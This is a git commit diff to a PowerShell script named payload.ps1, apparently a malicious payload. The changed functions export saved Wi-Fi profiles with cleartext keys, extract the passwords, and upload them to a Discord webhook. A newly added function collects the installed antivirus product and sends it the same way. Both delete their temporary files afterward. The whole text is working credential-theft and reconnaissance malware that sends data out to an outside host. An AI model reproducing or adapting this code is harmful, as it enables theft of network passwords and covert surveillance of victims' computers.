6ccfae5792322c6f16bd962463ea012438138b16
blobs0 <70648608+blobs0@users.noreply.github.com>
2022-12-30 19:19:36 +0100

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -33,24 +33,28 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
 }
 
-function Create-Wifi-File {
-
-  
+function Wifi {
 New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
 Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
 Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
-}
-
-function Del-Wifi-File {
+Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
 Set-Location -Path "$env:temp"
 Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
- }
+}
+
  function Del-Nirsoft-File {
   cd C:\
   rmdir -R \temp
 }
-  
 
- Create-Wifi-File
+function version-av {
+  mkdir \temp 
+  cd \temp
+  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
+  Upload-Discord -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
+  cd C:\
+  rmdir -R \temp
+}
+
 
 
